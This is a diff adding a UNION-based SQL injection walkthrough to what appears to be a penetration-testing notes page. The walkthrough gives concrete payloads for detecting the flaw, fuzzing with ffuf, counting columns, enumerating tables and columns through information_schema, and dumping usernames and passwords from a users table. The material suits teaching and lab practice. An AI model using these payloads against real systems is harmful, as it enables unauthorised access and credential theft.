@@ -617,6 +617,74 @@ SELECT * FROM users\G     -- vertical format (cleaner)
 
 ---
 
+## UNION Injection Full Walkthrough
+
+Step-by-step example against a search form vulnerable to SQL injection.
+
+### 1. Identify Injection Point
+
+Input a single quote `'` into the search field. If you get a SQL error, injection is likely:
+
+```
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
+```
+
+### 2. Fuzz for SQLi with ffuf
+
+Save the POST request from Burp with the injection point and fuzz with a SQLi wordlist:
+
+```bash
+ffuf -request search.req -request-proto http -w /path/to/sqli-basic.txt -fs 878
+```
+
+### 3. Determine Column Count
+
+Increment the UNION SELECT column count until the error disappears:
+
+```
+searchitem=1'+UNION+SELECT+1--+-
+# Error: The used SELECT statements have a different number of columns
+
+searchitem=1'+UNION+SELECT+1,2,3,4--+-
+# No error — 4 columns confirmed
+```
+
+### 4. Identify Visible Columns
+
+```
+searchitem=1'+UNION+SELECT+1,2,3,4--+-
+# Columns 2, 3, and 4 are displayed on the page
+```
+
+### 5. Extract Database Name
+
+```
+searchitem=1'+UNION+SELECT+1,2,3,database()--+-
+# Output: status
+```
+
+### 6. Enumerate Tables
+
+```
+searchitem=1'+UNION+SELECT+1,2,3,table_name+FROM+information_schema.tables+WHERE+table_schema='status'--+-
+# Output: company, users
+```
+
+### 7. Enumerate Columns
+
+```
+searchitem=1'+UNION+SELECT+1,2,3,column_name+FROM+information_schema.columns+WHERE+table_name='users'--+-
+# Output: current_connections, total_connection, user, id, password, username
+```
+
+### 8. Dump Credentials
+
+```
+searchitem=1'+UNION+SELECT+1,username,password,4+FROM+status.users--+-
+```
+
+---
+
 ## SQLMap
 
 **See dedicated page:** [SQLMap Guide](../tool-guides/sqlmap.md)
